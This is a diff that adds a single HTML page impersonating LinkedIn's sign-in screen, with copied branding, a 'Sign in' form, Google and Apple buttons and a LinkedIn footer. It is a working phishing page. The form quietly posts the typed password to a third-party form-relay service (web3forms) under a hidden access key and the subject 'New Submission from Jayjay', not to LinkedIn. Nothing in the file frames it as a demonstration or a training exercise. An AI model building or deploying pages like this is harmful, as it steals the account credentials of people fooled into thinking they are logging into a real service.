@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LinkedIn Login</title>
+
+  <style>
+    /* General Styles */
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f3f2ef;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+  }
+  
+  .container {
+    width: 400px;
+    background-color: #ffffff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+  }
+  
+  .logo img {
+    display: block;
+    margin: 0 auto 20px;
+    height: 30px;
+  }
+  
+  .form-container h2 {
+    text-align: center;
+    font-size: 1.5rem;
+    margin-bottom: 10px;
+  }
+  
+  .form-container p {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #6a6a6a;
+    margin-bottom: 20px;
+  }
+  
+  .input-field {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #d6d6d6;
+      border-radius: 5px;
+      font-size: 1rem;
+      box-sizing: border-box; /* Ensure padding is included in the width */
+  }
+  
+  .password-container {
+    position: relative;
+  }
+  
+  .show-password {
+    position: absolute;
+    right: 10px;
+    top: 12px;
+    font-size: 0.9rem;
+    color: #0073b1;
+    cursor: pointer;
+  }
+  
+  .forgot-password {
+    display: block;
+    text-align: left;
+    font-size: 0.9rem;
+    color: #0073b1;
+    text-decoration: none;
+    margin-bottom: 15px;
+  }
+  
+  .checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 15px;
+  }
+  
+  .checkbox-container input {
+    margin-right: 10px;
+  }
+  
+  .sign-in-button {
+    background-color: #0073b1;
+    color: #ffffff;
+    width: 100%;
+    padding: 12px;
+    font-size: 1rem;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-bottom: 20px;
+  }
+  
+  .divider {
+    text-align: center;
+    margin: 15px 0;
+    font-size: 0.9rem;
+    color: #6a6a6a;
+    position: relative;
+  }
+  
+  .divider::before,
+  .divider::after {
+    content: '';
+    position: absolute;
+    height: 1px;
+    width: 40%;
+    background: #d6d6d6;
+    top: 50%;
+    transform: translateY(-50%);
+  }
+  
+  .divider::before {
+    left: 0;
+  }
+  
+  .divider::after {
+    right: 0;
+  }
+  
+  .google-button,
+  .apple-button {
+    width: 100%;
+    padding: 12px;
+    font-size: 0.9rem;
+    border: 1px solid #d6d6d6;
+    border-radius: 5px;
+    background: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 10px;
+    cursor: pointer;
+  }
+  
+  .google-button img,
+  .apple-button img {
+    height: 20px;
+    margin-right: 10px;
+  }
+  
+  .footer-text {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #6a6a6a;
+    margin-top: 15px;
+  }
+  
+  .footer-text a {
+    color: #0073b1;
+    text-decoration: none;
+  }
+  
+  footer {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 0.8rem;
+  }
+  
+  footer ul {
+    list-style: none;
+    padding: 0;
+  }
+  
+  footer ul li {
+    display: inline;
+    margin-right: 10px;
+  }
+  
+  footer ul li a {
+    color: #6a6a6a;
+    text-decoration: none;
+  }
+  
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" alt="LinkedIn Logo">
+    </div>
+    <div class="form-container">
+      <h2>Sign in</h2>
+      <p>Stay updated on your professional world.</p>
+      <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="00ed92cb-5032-4578-b9be-306700b2271e">
+        <input type="hidden" name="subject" value="New Submission from Jayjay">
+        <input type="hidden" name="from_name" value="Your Website Name">
+        <input type="text" placeholder="Email or phone" class="input-field">
+        <div class="password-container" name="email or phone">
+          <input type="password" placeholder="Password" class="input-field" name="pass">
+          <span class="show-password">Show</span>
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="checkbox-container">
+          <input type="checkbox" id="keep-logged-in">
+          <label for="keep-logged-in">Keep me logged in</label>
+        </div>
+        <button type="submit" class="sign-in-button">Sign in</button>
+        <div class="divider">or</div>
+        <button class="google-button">
+          <img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png" alt="Google Icon">
+          Continue with Google
+        </button>
+        <button class="apple-button">
+          <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" alt="Apple Icon">
+          Sign in with Apple
+        </button>
+      </form>
+      <p class="footer-text">New to LinkedIn? <a href="#">Join now</a></p>
+    </div>
+    <footer>
+      <p>© 2025 LinkedIn</p>
+      <ul class="footer-links">
+        <li><a href="#">User Agreement</a></li>
+        <li><a href="#">Privacy Policy</a></li>
+        <li><a href="#">Cookie Policy</a></li>
+      </ul>
+    </footer>
+  </div>
+</body>
+</html>
